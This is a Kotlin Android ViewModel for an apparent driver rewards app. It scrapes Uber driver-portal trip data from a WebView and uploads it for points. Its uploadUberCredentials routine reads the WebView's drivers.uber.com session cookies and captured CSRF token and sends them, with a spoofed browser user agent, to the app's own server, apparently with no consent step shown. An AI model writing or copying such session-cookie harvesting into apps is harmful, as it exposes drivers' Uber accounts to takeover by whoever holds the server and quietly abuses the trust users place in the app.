package com.driversreward.app.ui.screens

import android.util.Log
import android.webkit.CookieManager
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.driversreward.app.data.api.RawTripItem
import com.driversreward.app.data.api.RewardsApi
import com.driversreward.app.data.repository.AuthRepository
import com.driversreward.app.data.repository.TripRepository
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject

private const val TAG = "DriversReward"

data class WebViewUiState(
    val isLoading: Boolean = false,
    val pointsEarned: Int = 0,
    val tripsProcessed: Int = 0,
    val error: String? = null,
    val loginState: String = "unknown",
    val loginMessage: String = "Waiting for Uber portal...",
    val syncStep: String? = null,
    val syncMessage: String? = null,
    val syncProgress: Int = 0,
    val syncTotal: Int = 0,
    val isSyncing: Boolean = false
)

@HiltViewModel
class WebViewViewModel @Inject constructor(
    private val tripRepository: TripRepository,
    private val authRepository: AuthRepository,
    private val api: RewardsApi
) : ViewModel() {

    private val _uiState = MutableStateFlow(WebViewUiState())
    val uiState: StateFlow<WebViewUiState> = _uiState.asStateFlow()

    private val rawTripQueue = mutableListOf<RawTripItem>()
    private val seenUrls = mutableSetOf<String>()
    private val submittedFeedKeys = mutableSetOf<String>()
    private var capturedCsrfToken: String? = null

    fun onTripCaptured(rawBody: String, url: String) {
        viewModelScope.launch {
            try {
                if (rawBody.length < 50) {
                    Log.d(TAG, "onTripCaptured: body too short (${rawBody.length}), skipping")
                    return@launch
                }

                val peek = try { JSONObject(rawBody) } catch (_: Exception) {
                    Log.w(TAG, "onTripCaptured: not valid JSON, skipping")
                    return@launch
                }
                if (peek.optString("status") == "failure") {
                    Log.d(TAG, "onTripCaptured: Uber error response, skipping")
                    return@launch
                }

                val tripUuid = extractUuidFromUrl(url)
                    .ifEmpty { peek.optJSONObject("data")?.optString("uuid", "") ?: peek.optString("uuid", "") }

                val dedupeKey = tripUuid.ifEmpty { url }
                if (dedupeKey.isNotEmpty() && seenUrls.contains(dedupeKey)) {
                    Log.d(TAG, "onTripCaptured: duplicate $dedupeKey, skipping")
                    return@launch
                }
                if (dedupeKey.isNotEmpty()) seenUrls.add(dedupeKey)

                rawTripQueue.add(RawTripItem(rawBody = rawBody, tripUuid = tripUuid, url = url))
                Log.d(TAG, "onTripCaptured: queued trip $tripUuid (queue=${rawTripQueue.size}, body=${rawBody.length} bytes)")

                if (rawTripQueue.size >= 20) {
                    flushRawTrips()
                }
            } catch (e: Exception) {
                Log.e(TAG, "onTripCaptured error: ${e.message}")
            }
        }
    }

    fun onActivityFeedCaptured(rawJson: String) {
        viewModelScope.launch {
            try {
                val peek = JSONObject(rawJson)
                val data = peek.optJSONObject("data")
                val start = data?.optString("startDateIso", "") ?: ""
                val end = data?.optString("endDateIso", "") ?: ""
                val key = "$start|$end"
                if (key != "|" && submittedFeedKeys.contains(key)) {
                    Log.d(TAG, "onActivityFeedCaptured: already submitted $key, skipping")
                    return@launch
                }
                if (key != "|") submittedFeedKeys.add(key)
                tripRepository.submitActivityFeed(rawJson)
            } catch (_: Exception) { }
        }
    }

    fun onLoginState(state: String, message: String) {
        _uiState.update { it.copy(loginState = state, loginMessage = message) }
    }

    fun onProgressUpdate(step: String, message: String, progress: Int, total: Int) {
        _uiState.update {
            it.copy(
                syncStep = step,
                syncMessage = message,
                syncProgress = progress,
                syncTotal = total,
                isSyncing = step != "complete"
            )
        }
    }

    fun onCsrfCaptured(csrfToken: String) {
        if (csrfToken.isNotEmpty()) {
            capturedCsrfToken = csrfToken
            viewModelScope.launch { uploadUberCredentials() }
        }
    }

    fun onAutoFetchComplete() {
        viewModelScope.launch {
            Log.d(TAG, "onAutoFetchComplete: flushing ${rawTripQueue.size} queued trips")
            flushRawTrips()
            _uiState.update { it.copy(isSyncing = false, syncMessage = "Sync complete!") }
            uploadUberCredentials()
        }
    }

    private suspend fun uploadUberCredentials() {
        val csrf = capturedCsrfToken ?: return
        try {
            val cookies = CookieManager.getInstance().getCookie("https://drivers.uber.com")
            if (cookies.isNullOrEmpty()) {
                Log.w(TAG, "uploadCred: no cookies found")
                return
            }
            val token = authRepository.getAccessToken() ?: run {
                Log.w(TAG, "uploadCred: no access token")
                return
            }
            val body = mapOf(
                "cookies" to cookies,
                "csrfToken" to csrf,
                "userAgent" to "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
                "source" to "android_app"
            )
            val res = api.storeCredential("Bearer $token", body)
            Log.d(TAG, "uploadCred: ${res.code()} ${if (res.isSuccessful) "OK" else res.errorBody()?.string()?.take(100)}")
        } catch (e: Exception) {
            Log.e(TAG, "uploadCred failed: ${e.message}")
        }
    }

    private suspend fun flushRawTrips() {
        if (rawTripQueue.isEmpty()) {
            Log.d(TAG, "flushRawTrips: queue empty, nothing to flush")
            return
        }

        val totalCreated = mutableListOf<Int>()
        val totalPoints = mutableListOf<Int>()

        while (rawTripQueue.isNotEmpty()) {
            val batch = rawTripQueue.take(20)
            Log.d(TAG, "flushRawTrips: sending batch of ${batch.size} (${rawTripQueue.size} total)")

            try {
                val result = tripRepository.submitRawTrips(batch)
                if (result != null) {
                    rawTripQueue.subList(0, batch.size).clear()
                    totalCreated.add(result.created)
                    totalPoints.add(result.totalPointsAwarded)
                    Log.d(TAG, "flushRawTrips: batch done — created=${result.created}, dupes=${result.duplicates}, errors=${result.errors}, pts=${result.totalPointsAwarded}")
                } else {
                    Log.e(TAG, "flushRawTrips: null response, stopping flush")
                    _uiState.update { it.copy(error = "Server returned an error during sync") }
                    break
                }
            } catch (e: Exception) {
                Log.e(TAG, "flushRawTrips: exception: ${e.message}")
                _uiState.update { it.copy(error = "Sync failed: ${e.message}") }
                break
            }
        }

        val created = totalCreated.sum()
        val points = totalPoints.sum()
        _uiState.update {
            it.copy(
                pointsEarned = it.pointsEarned + points,
                tripsProcessed = it.tripsProcessed + created
            )
        }
        Log.d(TAG, "flushRawTrips complete: created=$created, points=$points")
    }

    private fun extractUuidFromUrl(url: String): String {
        val match = Regex("[?&]uuid=([^&]+)").find(url) ?: return ""
        return match.groupValues[1]
    }

    override fun onCleared() {
        super.onCleared()
        viewModelScope.launch { flushRawTrips() }
    }
}
